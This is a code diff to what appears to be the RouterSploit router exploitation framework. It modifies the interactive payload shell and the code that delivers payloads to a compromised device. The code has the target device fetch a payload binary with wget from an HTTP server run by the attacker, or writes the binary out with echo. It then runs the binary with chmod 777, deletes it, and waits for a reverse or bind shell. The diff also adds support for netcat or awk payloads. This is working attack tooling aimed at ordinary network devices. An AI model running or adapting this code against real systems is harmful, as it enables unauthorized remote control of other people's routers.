@@ -21,10 +21,13 @@ from routersploit.utils import (
 )
 
 
-def shell(exploit, architecture="", method="", **params):
+def shell(exploit, architecture="", method="", payloads=None, **params):
     path = "routersploit/modules/payloads/{}/".format(architecture)
     payload = None
     options = []
+
+    if not payloads:
+        payloads = [f.split(".")[0] for f in listdir(path) if isfile(join(path, f)) and f.endswith(".py") and f != "__init__.py"]
 
     print_info()
     print_success("Welcome to cmd. Commands are sent to the target via the execute method.")
@@ -39,7 +42,7 @@ def shell(exploit, architecture="", method="", **params):
         if payload is None:
             cmd_str = "\001\033[4m\002cmd\001\033[0m\002 > "
         else:
-            cmd_str = "\001\033[4m\002cmd\001\033[0m\002 (\033[92m{}\033[0m) > ".format(payload._Exploit__info__['name'])
+            cmd_str = "\001\033[4m\002cmd\001\033[0m\002 (\033[94m{}\033[0m) > ".format(payload._Exploit__info__['name'])
 
         cmd = raw_input(cmd_str)
 
@@ -47,8 +50,6 @@ def shell(exploit, architecture="", method="", **params):
             return
 
         elif cmd == "show payloads":
-            payloads = [f.split(".")[0] for f in listdir(path) if isfile(join(path, f)) and f.endswith(".py") and f != "__init__.py"]
-
             print_status("Available payloads:")
             for payload_name in payloads:
                 print_info("- {}".format(payload_name))
@@ -56,20 +57,23 @@ def shell(exploit, architecture="", method="", **params):
         elif cmd.startswith("set payload "):
             c = cmd.split(" ")
 
-            payload_path = path.replace("/", ".") + c[2]
-            payload = getattr(importlib.import_module(payload_path), 'Exploit')()
+            if c[2] in payloads:
+                payload_path = path.replace("/", ".") + c[2]
+                payload = getattr(importlib.import_module(payload_path), 'Exploit')()
 
-            options = []
-            for option in payload.exploit_attributes.keys():
-                if option not in ["output", "filepath"]:
-                    options.append([option, getattr(payload, option), payload.exploit_attributes[option]])
+                options = []
+                for option in payload.exploit_attributes.keys():
+                    if option not in ["output", "filepath"]:
+                        options.append([option, getattr(payload, option), payload.exploit_attributes[option]])
 
-            if payload.handler == "bind_tcp":
-                options.append(["rhost", validators.ipv4(exploit.target), "Target IP address"])
+                if payload.handler == "bind_tcp":
+                    options.append(["rhost", validators.ipv4(exploit.target), "Target IP address"])
 
-                if method == "wget":
-                    options.append(["lhost", "", "Connect-back IP address for wget"])
-                    options.append(["lport", 4545, "Connect-back Port for wget"])
+                    if method == "wget":
+                        options.append(["lhost", "", "Connect-back IP address for wget"])
+                        options.append(["lport", 4545, "Connect-back Port for wget"])
+            else:
+                print_error("Payload not available")
 
         elif payload is not None:
             if cmd == "show options":
@@ -86,11 +90,19 @@ def shell(exploit, architecture="", method="", **params):
                 else:
                     for option in options:
                         if option[0] == c[1]:
-                            print_success("{'" + c[1] + "': '" + c[2] + "'}")
+                            try:
+                                setattr(payload, c[1], c[2])
+                            except:
+                                print_error("Invalid value for {}".format(c[1]))
+                                break
+
                             option[1] = c[2]
-                            setattr(payload, c[1], c[2])
+                            print_success("{'" + c[1] + "': '" + c[2] + "'}")
 
             elif cmd == "run":
+                if not payload.validate_params():
+                    continue
+
                 data = payload.generate()
 
                 if method == "wget":
@@ -102,8 +114,8 @@ def shell(exploit, architecture="", method="", **params):
                     communication = Communication(exploit, elf_binary, options, **params)
                     communication.echo()
                 elif method == "generic":
-                    params["exec_binary"] = data
-                    communication = Communication(exploit, elf_binary, options, **params)
+                    params['exec_binary'] = data
+                    communication = Communication(exploit, "", options, **params)
 
                 if payload.handler == "bind_tcp":
                     communication.bind_tcp()
@@ -115,7 +127,7 @@ def shell(exploit, architecture="", method="", **params):
 
         else:
             print_status("Executing '{}' on the device...".format(cmd))
-            exploit.execute(cmd)
+            print_info(exploit.execute(cmd))
 
 
 class HttpRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
@@ -158,9 +170,23 @@ class Communication(object):
         # name of the binary - its random 8 bytes
         self.binary_name = None
 
+        # is port used 
+        self.port_used = False
+
+        # mutex
+        self.mutex = False
+
     def http_server(self, lhost, lport):
         print_status("Setting up HTTP server")
-        server = HttpServer((lhost, int(lport)), HttpRequestHandler)
+
+        try:
+            server = HttpServer((lhost, int(lport)), HttpRequestHandler)
+        except socket.error:
+            self.port_used = True
+            self.mutex = False
+            return None
+
+        self.mutex = False
 
         server.serve_forever(self.payload)
         server.server_close()
@@ -175,9 +201,17 @@ class Communication(object):
             binary = "wget"
 
         # run http server
+        self.mutex = True
         thread = threading.Thread(target=self.http_server, args=(self.options['lhost'], self.options['lport']))
         thread.start()
 
+        while self.mutex:
+            pass
+
+        if self.port_used:
+            print_error("Could not set up HTTP Server on {}:{}".format(self.options['lhost'], self.options['lport']))
+            return 
+            
         # wget binary
         print_status("Using wget to download binary")
         cmd = "{} http://{}:{}/{} -O {}/{}".format(binary,
@@ -217,7 +251,7 @@ class Communication(object):
         num_parts = (size / echo_max_length) + 1
 
         # transfer binary through echo command
-        print_status("Using echo method to transfer binary")
+        print_status("Sending payload to {}".format(path))
         for i in range(0, num_parts):
             current = i * echo_max_length
             print_status("Transferring {}/{} bytes".format(current, len(self.payload)))
@@ -230,14 +264,22 @@ class Communication(object):
     def listen(self, lhost, lport):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.bind((lhost, int(lport)))
-        sock.listen(5)
+
+        try:
+            sock.bind((lhost, int(lport)))
+            sock.listen(5)
+        except socket.error:
+            self.port_used = True
+            return None
+
         return sock
 
     def build_commands(self):
         path = "{}/{}".format(self.location, self.binary_name)
 
         commands = []
+
+        # set of instructions to execute payload on the device
         if isinstance(self.exec_binary, list) or isinstance(self.exec_binary, tuple):
             for item_exec_binary in self.exec_binary:
                 if isinstance(item_exec_binary, str):
@@ -247,6 +289,12 @@ class Communication(object):
                         commands.append(item_exec_binary)
                 elif callable(item_exec_binary):
                     commands.append(item_exec_binary(path))
+
+        # instruction to execute generic payload e.g. netcat / awk
+        elif isinstance(self.exec_binary, str):
+            commands.append(self.exec_binary)
+
+        # default way of exectuign payload
         else:
             exec_binary_str = "chmod 777 {0}; {0}; rm {0}".format(path)
             commands.append(exec_binary_str) 
@@ -255,13 +303,22 @@ class Communication(object):
 
     def reverse_tcp(self):
         sock = self.listen(self.options['lhost'], self.options['lport'])
+        if self.port_used:
+            print_error("Could not set up listener on {}:{}".format(self.options['lhost'], self.options['lport']))
+            return
 
         # execute binary
         commands = self.build_commands()
 
-        for command in commands:
-            thread = threading.Thread(target=self.exploit.execute, args=(command,))
-            thread.start()
+        print_status("Executing payload on the device")
+
+        # synchronized commands
+        for command in commands[:-1]:
+            self.exploit.execute(command)
+
+        # asynchronous last command to execute binary
+        thread = threading.Thread(target=self.exploit.execute, args=(commands[-1],))
+        thread.start()
 
         # waiting for shell
         print_status("Waiting for reverse shell...")
